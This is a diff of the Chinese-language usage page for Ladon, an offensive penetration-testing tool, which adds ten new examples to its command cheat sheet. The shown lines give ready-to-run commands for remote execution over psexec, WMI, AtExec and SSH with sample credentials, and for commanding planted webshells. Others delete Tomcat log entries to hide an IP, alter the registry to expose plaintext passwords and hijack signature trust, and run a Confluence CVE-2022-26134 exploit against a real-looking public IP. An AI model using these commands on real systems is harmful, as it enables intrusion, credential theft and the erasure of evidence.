@@ -169,7 +169,7 @@ Visit <span id="busuanzi_value_page_pv"></span>
 </%></p>
 
 <p>Ladon 简明使用教程 完整文档: <a href="http://k8gege.org/Ladon">http://k8gege.org/Ladon</a><br>支持Cmd、Shell、Cobalt Strike、PowerShell下使用<br>Windows版本: .Net、Cobalt Strike、PowerShell<br>全系统版本：GO(全平台)、Python(理论上全平台)<br>PS: GUI版主要方便本地测试使用，完整功能使用CMD</p>
-<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon9.1.4 20220318<br>简明用法例子 150例</p>
+<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon9.1.7 20220618<br>简明用法例子 160例</p>
 <h3 id="001-自定义线程扫描"><a href="#001-自定义线程扫描" class="headerlink" title="001 自定义线程扫描"></a>001 自定义线程扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞<br>单线程：Ladon 10.1.2.8/24 MS17010 t=1<br>80线程：Ladon noping 10.1.2.8/24 MS17010 t=80<br>在高强度防护下的网络默认线程无法扫描，必须单线程</p>
 <h3 id="002-Socks5代理扫描"><a href="#002-Socks5代理扫描" class="headerlink" title="002 Socks5代理扫描"></a>002 Socks5代理扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>Ladon noping 10.1.2.8/24 MS17010<br>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p>
 <h3 id="003-网段扫描-批量扫描"><a href="#003-网段扫描-批量扫描" class="headerlink" title="003 网段扫描/批量扫描"></a>003 网段扫描/批量扫描</h3><p>CIDR格式：不只是/24/16/8(所有)<br>Ladon 192.168.1.8/24 扫描模块<br>Ladon 192.168.1.8/16 扫描模块<br>Ladon 192.168.1.8/8  扫描模块</p>
@@ -198,6 +198,8 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <h5 id="023-扫描C段站点URL域名"><a href="#023-扫描C段站点URL域名" class="headerlink" title="023 扫描C段站点URL域名"></a>023 扫描C段站点URL域名</h5><p>Ladon 192.168.1.8/24 SameWeb</p>
 <h5 id="024-扫描子域名、二级域名"><a href="#024-扫描子域名、二级域名" class="headerlink" title="024 扫描子域名、二级域名"></a>024 扫描子域名、二级域名</h5><p>Ladon baidu.com SubDomain</p>
 <h5 id="025-域名解析IP、主机名解析IP"><a href="#025-域名解析IP、主机名解析IP" class="headerlink" title="025 域名解析IP、主机名解析IP"></a>025 域名解析IP、主机名解析IP</h5><p>Ladon baidu.com DomainIP<br>Ladon baidu.com HostIP</p>
+<h5 id="025-批量域名解析IP、批量主机名解析IP"><a href="#025-批量域名解析IP、批量主机名解析IP" class="headerlink" title="025 批量域名解析IP、批量主机名解析IP"></a>025 批量域名解析IP、批量主机名解析IP</h5><p>Ladon domain.txt DomainIP<br>Ladon host.txt HostIP</p>
+<h5 id="025-批量域名、主机名解析-结果只有IP"><a href="#025-批量域名、主机名解析-结果只有IP" class="headerlink" title="025 批量域名、主机名解析 结果只有IP"></a>025 批量域名、主机名解析 结果只有IP</h5><p>Ladon domain.txt Domain2IP<br>Ladon host.txt Host2IP</p>
 <h5 id="026-DNS查询域内机器、IP-条件域内"><a href="#026-DNS查询域内机器、IP-条件域内" class="headerlink" title="026 DNS查询域内机器、IP (条件域内)"></a>026 DNS查询域内机器、IP (条件域内)</h5><p>Ladon AdiDnsDump 192.168.1.8 (Domain IP)</p>
 <h5 id="027-查询域内机器、IP-条件域内"><a href="#027-查询域内机器、IP-条件域内" class="headerlink" title="027 查询域内机器、IP (条件域内)"></a>027 查询域内机器、IP (条件域内)</h5><p>Ladon GetDomainIP</p>
 <h5 id="028-扫描C段端口、指定端口扫描"><a href="#028-扫描C段端口、指定端口扫描" class="headerlink" title="028 扫描C段端口、指定端口扫描"></a>028 扫描C段端口、指定端口扫描</h5><p>Ladon 192.168.1.8/24 PortScan<br>Ladon 192.168.1.8 PortScan 80,445,3389</p>
@@ -274,7 +276,7 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <h5 id="098-RdpLog查看3389连接记录"><a href="#098-RdpLog查看3389连接记录" class="headerlink" title="098 RdpLog查看3389连接记录"></a>098 RdpLog查看3389连接记录</h5><p>Ladon RdpLog</p>
 <h3 id="远程执行-psexec-wmiexec-atexec-sshexec-smbexec"><a href="#远程执行-psexec-wmiexec-atexec-sshexec-smbexec" class="headerlink" title="远程执行(psexec/wmiexec/atexec/sshexec/smbexec)"></a>远程执行(psexec/wmiexec/atexec/sshexec/smbexec)</h3><h5 id="099-445端口-加密PSEXEC远程执行命令（交互式）"><a href="#099-445端口-加密PSEXEC远程执行命令（交互式）" class="headerlink" title="099 445端口 加密PSEXEC远程执行命令（交互式）"></a>099 445端口 加密PSEXEC远程执行命令（交互式）</h5><p>net user \192.168.1.8 k8gege520 /user:k8gege<br>Ladon psexec 192.168.1.8<br>psexec&gt; whoami<br>nt authority\system</p>
 <h5 id="100-135端口-WmiExec远程执行命令-（非交互式）"><a href="#100-135端口-WmiExec远程执行命令-（非交互式）" class="headerlink" title="100 135端口 WmiExec远程执行命令 （非交互式）"></a>100 135端口 WmiExec远程执行命令 （非交互式）</h5><p>Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami  (8.2前用法)<br>Ladon wmiexec 192.168.1.8 k8gege k8gege520 cmd whoami  (8.2后用法)<br>Ladon wmiexec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p  (8.2后用法)</p>
-<h5 id="101-445端口-AtExec远程执行命令（非交互式）"><a href="#101-445端口-AtExec远程执行命令（非交互式）" class="headerlink" title="101 445端口 AtExec远程执行命令（非交互式）"></a>101 445端口 AtExec远程执行命令（非交互式）</h5><p>Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami</p>
+<h5 id="101-445端口-AtExec远程执行命令（非交互式）"><a href="#101-445端口-AtExec远程执行命令（非交互式）" class="headerlink" title="101 445端口 AtExec远程执行命令（非交互式）"></a>101 445端口 AtExec远程执行命令（非交互式）</h5><p>Ladon AtExec 192.168.1.8 k8gege k8gege520 whoami</p>
 <h5 id="102-22端口-SshExec远程执行命令（非交互式）"><a href="#102-22端口-SshExec远程执行命令（非交互式）" class="headerlink" title="102 22端口 SshExec远程执行命令（非交互式）"></a>102 22端口 SshExec远程执行命令（非交互式）</h5><p>Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami<br>Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami</p>
 <h5 id="103-JspShell远程执行命令（非交互式）"><a href="#103-JspShell远程执行命令（非交互式）" class="headerlink" title="103 JspShell远程执行命令（非交互式）"></a>103 JspShell远程执行命令（非交互式）</h5><p>Usage：Ladon JspShell type url pwd cmd<br>Example: Ladon JspShell ua <a href="http://192.168.1.8/shell.jsp" target="_blank" rel="noopener">http://192.168.1.8/shell.jsp</a> Ladon whoami</p>
 <h5 id="104-WebShell远程执行命令（非交互式）"><a href="#104-WebShell远程执行命令（非交互式）" class="headerlink" title="104 WebShell远程执行命令（非交互式）"></a>104 WebShell远程执行命令（非交互式）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon WebShell ScriptType ShellType url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami</span><br><span class="line">Example: Ladon WebShell aspx <span class="built_in">cd</span> http://192.168.1.8/1.aspx Ladon whoami</span><br><span class="line">Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami</span><br></pre></td></tr></table></figure>
@@ -328,7 +330,17 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <h5 id="148-Shiro插件探测"><a href="#148-Shiro插件探测" class="headerlink" title="148 Shiro插件探测"></a>148 Shiro插件探测</h5><p>Ladon 192.168.1.8/24 IsShiro</p>
 <h5 id="149-LogDelTomcat-删除Tomcat指定IP日志"><a href="#149-LogDelTomcat-删除Tomcat指定IP日志" class="headerlink" title="149 LogDelTomcat 删除Tomcat指定IP日志"></a>149 LogDelTomcat 删除Tomcat指定IP日志</h5><p>Ladon LogDelTomcat access.log 192.168.1.8</p>
 <h5 id="150-C-自定义程序集插件扫描"><a href="#150-C-自定义程序集插件扫描" class="headerlink" title="150 C#自定义程序集插件扫描"></a>150 C#自定义程序集插件扫描</h5><p>Ladon 192.168.1.8/24 Poc.exe<br>Ladon 192.168.1.8/24 *.dll(c#)</p>
-<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>V9.1.5：K8小密圈</p>
+<h5 id="151-ReadFile-读取大文件前面指定长度内容"><a href="#151-ReadFile-读取大文件前面指定长度内容" class="headerlink" title="151 ReadFile 读取大文件前面指定长度内容"></a>151 ReadFile 读取大文件前面指定长度内容</h5><p>Ladon ReadFile c:\k8.exe 1K<br>Ladon ReadFile c:\k8.exe 1024K<br>Ladon ReadFile c:\k8.exe 1M</p>
+<h5 id="152-修改注册表读取2012及后系统明文密码"><a href="#152-修改注册表读取2012及后系统明文密码" class="headerlink" title="152 修改注册表读取2012及后系统明文密码"></a>152 修改注册表读取2012及后系统明文密码</h5><p>Ladon SetMzLogonPwd 1</p>
+<h5 id="153-修改注册表劫持签名签证"><a href="#153-修改注册表劫持签名签证" class="headerlink" title="153 修改注册表劫持签名签证"></a>153 修改注册表劫持签名签证</h5><p>Ladon SetSignAuth 1 </p>
+<h5 id="154-IP24-批量IP转成ip24格式-192-168-1-1-24"><a href="#154-IP24-批量IP转成ip24格式-192-168-1-1-24" class="headerlink" title="154 IP24 批量IP转成ip24格式(192.168.1.1/24)"></a>154 IP24 批量IP转成ip24格式(192.168.1.1/24)</h5><p>Ladon ip.txt IP24</p>
+<h5 id="155-IPC-批量IP转成ip-C格式-192-168-1"><a href="#155-IPC-批量IP转成ip-C格式-192-168-1" class="headerlink" title="155 IPC  批量IP转成ip C格式(192.168.1.)"></a>155 IPC  批量IP转成ip C格式(192.168.1.)</h5><p>Ladon ip.txt IPC</p>
+<h5 id="156-IPB-批量IP转成ip-B格式-192-168"><a href="#156-IPB-批量IP转成ip-B格式-192-168" class="headerlink" title="156 IPB  批量IP转成ip B格式(192.168.)"></a>156 IPB  批量IP转成ip B格式(192.168.)</h5><p>Ladon ip.txt IPB</p>
+<h5 id="157-批量检测Atlassian-Confluence-CVE-2022-26134"><a href="#157-批量检测Atlassian-Confluence-CVE-2022-26134" class="headerlink" title="157 批量检测Atlassian Confluence CVE-2022-26134"></a>157 批量检测Atlassian Confluence CVE-2022-26134</h5><p>Ladon url.txt CVE-2022-26134</p>
+<h5 id="158-Atlassian-Confluence-CVE-2022-26134-EXP"><a href="#158-Atlassian-Confluence-CVE-2022-26134-EXP" class="headerlink" title="158 Atlassian Confluence CVE-2022-26134 EXP"></a>158 Atlassian Confluence CVE-2022-26134 EXP</h5><p>Ladon EXP-2022-26134 <a href="https://111.229.255.81" target="_blank" rel="noopener">https://111.229.255.81</a> id</p>
+<h5 id="159-SslInfo-证书探测设备、IP、域名、机器名、组织机构等信息"><a href="#159-SslInfo-证书探测设备、IP、域名、机器名、组织机构等信息" class="headerlink" title="159 SslInfo 证书探测设备、IP、域名、机器名、组织机构等信息"></a>159 SslInfo 证书探测设备、IP、域名、机器名、组织机构等信息</h5><p>Ladon <a href="https://k8gege.org">https://k8gege.org</a> SslInfo<br>Ladon k8gege.org SslInfo<br>Ladon k8gege.org:443 SslInfo 指定端口<br>Ladon noping fbi.gov SslInfo 禁ping探测<br>Ladon 192.168.1.1 SslInfo<br>Ladon 192.168.1.1:8443 SslInfo</p>
+<h5 id="160-SslInfo-证书批量探测设备、IP、域名、机器名、组织机构等信息"><a href="#160-SslInfo-证书批量探测设备、IP、域名、机器名、组织机构等信息" class="headerlink" title="160 SslInfo 证书批量探测设备、IP、域名、机器名、组织机构等信息"></a>160 SslInfo 证书批量探测设备、IP、域名、机器名、组织机构等信息</h5><p>Ladon ip.txt SslInfo<br>Ladon url.txt SslInfo<br>Ladon 192.168.1.1/c SslInfo<br>Ladon 192.168.1.1/b SslInfo</p>
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>911版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>V9.1.7：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
 </div>
@@ -382,8 +394,8 @@ Visit <span id="busuanzi_value_page_pv"></span>
         <p>
     K8tools: <a href="https://github.com/k8gege/K8tools" title target="_blank">K8工具合集</a> <br>
     K8blog: <a href="https://github.com/k8gege/k8blog" title target="_blank">V1.0 20200719</a> <br>
-    LadonGo: <a href="https://github.com/k8gege/LadonGo" title target="_blank">V3.9 20220422</a> <br>
-    Ladon: <a href="https://github.com/k8gege/Ladon" title target="_blank">V9.1.5 20220418</a> <br>
+    LadonGo: <a href="https://github.com/k8gege/LadonGo" title target="_blank">V4.0 20220520</a> <br>
+    Ladon: <a href="https://github.com/k8gege/Ladon" title target="_blank">V9.1.7 20220618</a> <br>
     Tools: <a href="http://k8gege.org/Download" title target="_blank">Download</a> <br>
     CS4.4: <a href="https://github.com/k8gege/Aggressor/releases/tag/cs" title target="_blank">Cobalt Strike</a> <br>
 </p>
